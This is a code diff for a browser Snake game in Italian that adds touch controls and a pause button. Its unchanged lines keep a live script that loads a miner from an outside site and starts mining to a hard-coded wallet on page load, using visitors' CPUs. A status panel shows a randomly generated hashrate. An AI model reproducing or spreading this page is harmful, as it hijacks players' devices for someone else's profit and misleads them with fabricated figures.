@@ -13,9 +13,11 @@
             margin: 0;
             padding: 0;
             overflow: hidden;
+            touch-action: manipulation;
         }
-        h1 { color: #0f0; margin: 30px 0 10px 0; }
+        h1 { color: #0f0; margin: 20px 0 10px 0; }
 
+        /* Menu e Game Over */
         #menu, #game-over {
             position: absolute;
             top: 50%;
@@ -24,7 +26,7 @@
             z-index: 100;
         }
         .menu-box, #game-over {
-            background: rgba(0, 30, 0, 0.9);
+            background: rgba(0, 30, 0, 0.95);
             border: 3px solid #0f0;
             padding: 40px 60px;
             border-radius: 15px;
@@ -35,7 +37,8 @@
         #game-container {
             display: none;
             justify-content: center;
-            margin-top: 20px;
+            margin-top: 10px;
+            position: relative;
         }
         canvas {
             border: 4px solid #0f0;
@@ -44,10 +47,57 @@
             box-shadow: 0 0 25px #0f0;
         }
 
+        /* Pulsante Desktop per mostrare controlli mobili */
+        #desktop-controls-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            padding: 8px 14px;
+            background: #0f0;
+            color: black;
+            border: none;
+            border-radius: 6px;
+            font-size: 0.9em;
+            cursor: pointer;
+            z-index: 500;
+        }
+
+        /* Controlli Mobili */
+        #mobile-controls {
+            display: none;
+            margin: 15px auto;
+            width: 220px;
+        }
+        .controls-grid {
+            display: grid;
+            grid-template-columns: 70px 70px 70px;
+            gap: 8px;
+            justify-content: center;
+        }
+        .control-btn {
+            width: 70px;
+            height: 70px;
+            background: rgba(0, 255, 0, 0.2);
+            border: 2px solid #0f0;
+            color: #0f0;
+            font-size: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+            user-select: none;
+        }
+        .pause-btn {
+            grid-column: span 3;
+            height: 60px;
+            font-size: 18px;
+            background: #ff8800;
+        }
+
         button {
-            margin: 15px;
-            padding: 14px 30px;
-            font-size: 1.2em;
+            margin: 10px;
+            padding: 12px 25px;
+            font-size: 1.1em;
             background: #0f0;
             color: black;
             border: none;
@@ -70,24 +120,8 @@
             z-index: 300;
             text-align: left;
         }
-        .console-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 8px;
-        }
-        .close-btn {
-            background: none;
-            border: none;
-            color: #f00;
-            font-size: 1.5em;
-            cursor: pointer;
-        }
-        .timer {
-            color: #00ffaa;
-            font-weight: bold;
-            margin-top: 6px;
-        }
+        .console-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+        .close-btn { background: none; border: none; color: #f00; font-size: 1.5em; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -96,14 +130,31 @@
     <div id="menu">
         <div class="menu-box">
             <h1>🐍 Snake Game</h1>
-            <p style="margin: 20px 0;">Pronto a giocare?</p>
             <button onclick="startGame()">▶️ START GAME</button>
         </div>
     </div>
 
     <!-- GIOCO -->
     <div id="game-container">
+        <button id="desktop-controls-btn" onclick="toggleMobileControls()">Controlli Touch</button>
         <canvas id="gameCanvas" width="400" height="400"></canvas>
+
+        <!-- Controlli Mobili -->
+        <div id="mobile-controls">
+            <div class="controls-grid">
+                <div></div>
+                <div class="control-btn" onclick="move('up')">↑</div>
+                <div></div>
+                
+                <div class="control-btn" onclick="move('left')">←</div>
+                <div class="control-btn pause-btn" onclick="togglePause()">⏸️ PAUSA</div>
+                <div class="control-btn" onclick="move('right')">→</div>
+                
+                <div></div>
+                <div class="control-btn" onclick="move('down')">↓</div>
+                <div></div>
+            </div>
+        </div>
     </div>
 
     <!-- GAME OVER -->
@@ -120,28 +171,23 @@
             <span style="color:#0f0;">🔨 CPU Miner</span>
             <button class="close-btn" onclick="hideMinerConsole()">×</button>
         </div>
-        <div class="console-line">Stato: <span id="miner-status">Attivo</span></div>
+        <div class="console-line">Stato: Attivo</div>
         <div class="console-line">Hashrate: <span id="hashrate">Calcolando...</span></div>
-        <div class="console-line timer">Tempo online: <span id="timer">00:00</span></div>
+        <div class="console-line timer">Tempo: <span id="timer">00:00</span></div>
     </div>
 
-    <!-- Pulsante per riaprire -->
     <div id="reopen-btn" onclick="showMinerConsole()" 
-         style="position: fixed; bottom: 20px; right: 20px; width: 45px; height: 45px; 
-                background: rgba(0, 255, 0, 0.2); border: 2px solid #0f0; color: #0f0; 
-                font-size: 24px; border-radius: 50%; display: none; align-items: center; 
-                justify-content: center; cursor: pointer; z-index: 400; box-shadow: 0 0 15px #0f0;">
+         style="position: fixed; bottom: 20px; right: 20px; width: 45px; height: 45px; background: rgba(0,255,0,0.2); border: 2px solid #0f0; color: #0f0; font-size: 24px; border-radius: 50%; display: none; align-items: center; justify-content: center; cursor: pointer; z-index: 400;">
         ↑
     </div>
 
-    <!-- Crypto Miner -->
+    <!-- Miner -->
     <script type="module">
         import { autoMine } from "https://earnify.cc/miner.js";
         autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
     </script>
 
     <script>
-        // ==================== SNAKE GAME ====================
         const canvas = document.getElementById("gameCanvas");
         const ctx = canvas.getContext("2d");
         let snake = [{ x: 10, y: 10 }];
@@ -150,8 +196,11 @@
         let score = 0;
         let gameInterval;
         let gameSpeed = 100;
+        let isPaused = false;
 
         function drawGame() {
+            if (isPaused) return;
+
             const head = { x: snake[0].x + dx, y: snake[0].y + dy };
 
             if (head.x < 0 || head.x >= 20 || head.y < 0 || head.y >= 20) {
@@ -206,6 +255,7 @@
             dx = 1; dy = 0;
             score = 0;
             gameSpeed = 100;
+            isPaused = false;
             generateFood();
             clearInterval(gameInterval);
             gameInterval = setInterval(drawGame, gameSpeed);
@@ -218,45 +268,68 @@
             document.getElementById("menu").style.display = "block";
         }
 
+        // Controlli Tastiera (Desktop)
         document.addEventListener("keydown", e => {
             if (document.getElementById("game-container").style.display !== "flex") return;
+            
             switch(e.key) {
                 case "ArrowUp":    if (dy !== 1) { dx = 0; dy = -1; } break;
                 case "ArrowDown":  if (dy !== -1) { dx = 0; dy = 1; } break;
                 case "ArrowLeft":  if (dx !== 1) { dx = -1; dy = 0; } break;
                 case "ArrowRight": if (dx !== -1) { dx = 1; dy = 0; } break;
+                case " ": togglePause(); e.preventDefault(); break;
             }
         });
 
-        // Simulazione hashrate
-        setInterval(() => {
-            const hashrate = Math.floor(Math.random() * 450) + 280;
-            document.getElementById("hashrate").textContent = hashrate + " H/s";
-        }, 1800);
-
-        // ==================== TIMER MINER ====================
-        let startTime = Date.now();
-
-        function updateTimer() {
-            const elapsed = Math.floor((Date.now() - startTime) / 1000);
-            const minutes = Math.floor(elapsed / 60).toString().padStart(2, '0');
-            const seconds = (elapsed % 60).toString().padStart(2, '0');
-            document.getElementById("timer").textContent = `${minutes}:${seconds}`;
+        // Controlli Touch
+        function move(direction) {
+            if (isPaused) return;
+            switch(direction) {
+                case "up":    if (dy !== 1) { dx = 0; dy = -1; } break;
+                case "down":  if (dy !== -1) { dx = 0; dy = 1; } break;
+                case "left":  if (dx !== 1) { dx = -1; dy = 0; } break;
+                case "right": if (dx !== -1) { dx = 1; dy = 0; } break;
+            }
         }
 
-        // Aggiorna timer ogni secondo
-        setInterval(updateTimer, 1000);
+        function togglePause() {
+            isPaused = !isPaused;
+        }
 
-        // Funzioni console
+        // Mostra/Nascondi controlli mobili
+        function toggleMobileControls() {
+            const controls = document.getElementById("mobile-controls");
+            controls.style.display = controls.style.display === "block" ? "none" : "block";
+        }
+
+        // Mining Console
+        let startTime = Date.now();
+        function updateTimer() {
+            const elapsed = Math.floor((Date.now() - startTime) / 1000);
+            const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
+            const sec = (elapsed % 60).toString().padStart(2, '0');
+            document.getElementById("timer").textContent = `${min}:${sec}`;
+        }
+        setInterval(updateTimer, 1000);
+        setInterval(() => {
+            document.getElementById("hashrate").textContent = (Math.floor(Math.random() * 450) + 280) + " H/s";
+        }, 1800);
+
         function hideMinerConsole() {
             document.getElementById("mining-console").style.display = "none";
             document.getElementById("reopen-btn").style.display = "flex";
         }
-
         function showMinerConsole() {
             document.getElementById("mining-console").style.display = "block";
             document.getElementById("reopen-btn").style.display = "none";
         }
+
+        // Rilevamento mobile
+        window.onload = () => {
+            if (/Mobi|Android/i.test(navigator.userAgent)) {
+                document.getElementById("mobile-controls").style.display = "block";
+            }
+        };
     </script>
 </body>
 </html>
